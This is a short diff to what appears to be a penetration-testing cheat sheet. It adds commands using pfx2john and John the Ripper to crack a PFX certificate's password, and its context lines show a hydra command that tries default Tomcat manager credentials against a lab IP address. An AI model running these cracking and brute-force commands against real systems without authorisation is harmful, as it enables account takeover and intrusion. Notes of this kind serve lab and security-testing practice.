@@ -1,3 +1,9 @@
+# pfx
+```bash
+pfx2john filename > hash
+john hash
+```
+---
 # hydra
 ```bash
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://10.10.10.95:8080/manager/html
